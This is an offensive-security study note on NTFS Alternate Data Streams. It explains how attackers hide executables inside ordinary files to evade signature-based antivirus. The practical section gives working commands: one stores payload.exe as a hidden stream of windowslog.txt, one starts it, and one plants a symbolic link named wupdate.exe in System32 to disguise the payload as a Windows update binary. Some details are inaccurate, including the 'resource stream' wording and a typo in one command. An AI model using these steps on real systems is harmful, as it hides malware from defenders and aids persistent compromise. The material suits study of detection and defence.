- Alternate Data Streams (ADS) is a NTFS (New Technology File System) ***file attribute*** and was designed to ***provide compatibility with the MacOS HFS (Hierarchical File System***).
- Any file created on an NTFS formatted drive will have two different forks/stream:
	- **Data stream** - Default stream that contains the data of the file.
	- **Resource stream** - Typically contains the metadata of the file.
- `Attackers can use ADS to hide malicious code or executables in legitimate files in order to evade detection by storing the malicious code or executables in the file attribute resource stream (metadata) of a legitimate file.`
- This technique is usually used to ***evade basic signature based AV's*** and ***static scanning tools***.

***

### Practical 
##### To create a Text File in Temp directory:
```
open cmd
cd Desktop
notepad test.txt:secret.txt
```
Note: Data will be written on the `secret.txt` before saving it.

##### To access the Hidden File
```
notepad test.txt:secret:txt
```
Note: `type` command will not work to read the hidden file.

##### Move the Payload to Hidden File
Once the payload is planted in the Temp folder, we are hiding the payload.exe into windowslog.txt with the name winpeas.exe:
```
cd \Temp
type payload.exe > windowslog.txt:winpeas.exe
```

##### Start the Payload
```
start windowslog.txt:winpeas.exe
```

##### Create a Symbolic Link
I need to put the absolute path:
```
cd Windows\System32
mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
wupdate  # This will start the payload
```
Note: Use the cmd prompt as an Administrator.